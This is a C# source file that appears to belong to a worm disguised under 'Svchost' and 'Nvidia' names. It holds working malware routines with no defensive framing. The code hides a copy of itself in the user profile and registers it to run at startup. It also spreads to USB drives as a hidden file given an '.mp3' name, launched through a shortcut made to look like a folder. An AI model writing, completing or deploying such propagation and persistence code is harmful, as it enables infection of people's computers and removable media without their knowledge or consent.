using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;

using System.Windows.Forms;
using Svchost.Spread;

namespace Svchost.TextHandling
{
    public class Spreader
    {
        private string shortcutIconLocation;
        private string cmdLocation;
        private string usbFolderName;
        private string assemblyName;
        private string fakeAssemblyName;
        private string applicationPath;
        private string sessionName;
        private string targetFolder;
        private DriveDetector driveDetector;

        public Spreader(string fakeAssembName, string assembName, string appPath, string windowsName)
        {
            fakeAssemblyName = fakeAssembName;
            assemblyName = assembName;
            applicationPath = appPath;
            sessionName = windowsName;
            cmdLocation = "C:\\Windows\\System32\\cmd.exe";
            shortcutIconLocation = @"C:\Windows\System32\SHELL32.dll,116";
            targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
            usbFolderName = "Music\\";

            checkEnvironment();
           /* if (checkEnvironment())
                driveDetector = new DriveDetector(applicationPath + assemblyName, replicateOverUSB);*/
        }

        public void replicateOverUSB(DriveInfo drive)
        {
            //Potentially not infected usb found
            string usbRootFolder = drive.RootDirectory.FullName;
            string targetFolder = usbRootFolder + usbFolderName;

            if (!Directory.Exists(targetFolder))
            {
                DirectoryInfo di;
                try { di = Directory.CreateDirectory(targetFolder); }
                catch{ return; }
            }

            //Copy the assembly with fake name
            string fullTargetPath = targetFolder + fakeAssemblyName + ".mp3";
            if (!File.Exists(fullTargetPath))
            {
                try
                {
                    //Copy and hide file
                    File.Copy(applicationPath + assemblyName, fullTargetPath);
                    File.SetAttributes(fullTargetPath, FileAttributes.Hidden);
                }
                catch { return; }

                object folder = (object)targetFolder;
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                string shortcutAddress = targetFolder + fakeAssemblyName + ".lnk";
                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutAddress);
                shortcut.TargetPath = cmdLocation;
                shortcut.Arguments = "/c \"" + fakeAssemblyName + ".mp3" + "\"";
                shortcut.WorkingDirectory = targetFolder;
                shortcut.IconLocation = shortcutIconLocation;
                shortcut.Save();
            }
        }
        
        private bool checkEnvironment()
        {
            if(applicationPath == targetFolder)
            {
                Regedit.setStartup(assemblyName, "\"" + applicationPath + assemblyName.Replace(".exe", "") + "\"");
                return true;
            }
            else
            {
                if (!Directory.Exists(targetFolder))
                {
                    DirectoryInfo di = Directory.CreateDirectory(targetFolder);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }

                string fullTargetPath = targetFolder + assemblyName; 
                string originPath = System.Reflection.Assembly.GetEntryAssembly().Location;
                if (!File.Exists(fullTargetPath))
                    File.Copy(originPath, fullTargetPath);

                try
                {
                    var spawn = Process.Start(fullTargetPath);
                }
                catch { }

                Process thisprocess = Process.GetCurrentProcess();
                thisprocess.CloseMainWindow();
                thisprocess.Close();
                thisprocess.Dispose();
                Application.Exit();
                Environment.Exit(0);
                return false;
            }
        }
    }
}
